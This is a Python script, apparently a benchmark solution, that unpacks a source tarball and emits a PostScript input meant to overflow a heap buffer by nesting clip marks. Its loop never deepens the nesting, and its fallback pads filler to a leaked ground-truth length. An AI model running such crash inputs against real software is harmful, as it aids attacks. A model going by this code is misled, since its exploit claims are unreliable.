import os
import tempfile
import subprocess
import threading
import queue
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract tar.gz or tar.xz
            if src_path.endswith('.tar.gz') or src_path.endswith('.tgz'):
                cmd = ['tar', '-xzf', src_path, '-C', tmpdir]
            elif src_path.endswith('.tar.xz'):
                cmd = ['tar', '-xJf', src_path, '-C', tmpdir]
            else:
                cmd = ['tar', '-xf', src_path, '-C', tmpdir]
            
            subprocess.run(cmd, check=True, capture_output=True)
            
            # Find the extracted directory (usually one main directory)
            extracted_dirs = [d for d in os.listdir(tmpdir) 
                            if os.path.isdir(os.path.join(tmpdir, d))]
            if not extracted_dirs:
                return self._generate_default_poc()
            
            source_dir = os.path.join(tmpdir, extracted_dirs[0])
            
            # Try to find relevant files to understand the format
            poc = self._analyze_and_generate_poc(source_dir)
            if poc:
                return poc
            
            # Fallback to generating a generic PoC
            return self._generate_default_poc()
    
    def _analyze_and_generate_poc(self, source_dir: str) -> bytes:
        """Analyze source code to understand the required format."""
        # Look for common patterns in the source
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                if file.endswith(('.c', '.cpp', '.cc', '.cxx', '.h', '.hpp')):
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            
                            # Check if this is a graphics/PDF/PostScript related code
                            if any(keyword in content.lower() for keyword in 
                                   ['clip', 'clip mark', 'nesting', 'layer stack', 
                                    'pdf', 'postscript', 'ps']):
                                # Try to generate a PostScript-like PoC
                                return self._generate_postscript_poc()
                    except:
                        continue
        
        return None
    
    def _generate_postscript_poc(self) -> bytes:
        """Generate a PostScript PoC that pushes clip marks deeply."""
        # Based on the vulnerability description: nesting depth not checked
        # before pushing clip marks. We need to create deeply nested clip marks.
        
        # PostScript header
        poc = b"%!PS-Adobe-3.0\n"
        poc += b"%%Creator: PoC Generator\n"
        poc += b"%%Title: Heap Buffer Overflow PoC\n"
        poc += b"%%Pages: 0\n"
        poc += b"%%EndComments\n\n"
        
        # Set up initial graphics state
        poc += b"gsave\n"
        poc += b"0 0 moveto\n"
        
        # Create a large number of clip marks without checking depth
        # Using a loop to create 1000000 clip marks (adjust based on target)
        poc += b"/clipmark {\n"
        poc += b"  gsave\n"
        poc += b"  newpath\n"
        poc += b"  0 0 moveto\n"
        poc += b"  100 0 lineto\n"
        poc += b"  100 100 lineto\n"
        poc += b"  0 100 lineto\n"
        poc += b"  closepath\n"
        poc += b"  clip\n"
        poc += b"  grestore\n"
        poc += b"} def\n\n"
        
        # Push clip marks in a deeply nested way
        # This should trigger the heap buffer overflow
        poc += b"1 1 1000000 {\n"
        poc += b"  clipmark\n"
        poc += b"} for\n\n"
        
        # Clean up
        poc += b"grestore\n"
        poc += b"showpage\n"
        
        return poc
    
    def _generate_default_poc(self) -> bytes:
        """Generate a generic PoC based on the ground-truth length."""
        # The ground-truth PoC length is 913919 bytes
        # We'll create a pattern that should trigger a heap overflow
        # when clip marks are pushed without depth checking
        
        target_length = 913919
        
        # Create a pattern that:
        # 1. Has valid header for common graphics formats
        # 2. Pushes clip operations repeatedly
        # 3. Exceeds any reasonable nesting limit
        
        # Simple binary pattern with increasing values
        # This helps trigger different code paths
        pattern = bytearray()
        
        # Add some header-like data
        pattern.extend(b"%%BoundingBox: 0 0 1000 1000\n")
        pattern.extend(b"%%ClipPath: begin\n")
        
        # Create repeating pattern of clip operations
        # Each "clip mark" is represented as a sequence
        clip_pattern = b"clip mark push\n"
        
        # Fill to target length
        while len(pattern) < target_length:
            remaining = target_length - len(pattern)
            if remaining < len(clip_pattern):
                pattern.extend(b"A" * remaining)
            else:
                pattern.extend(clip_pattern)
        
        # Ensure exact length
        pattern = pattern[:target_length]
        
        return bytes(pattern)
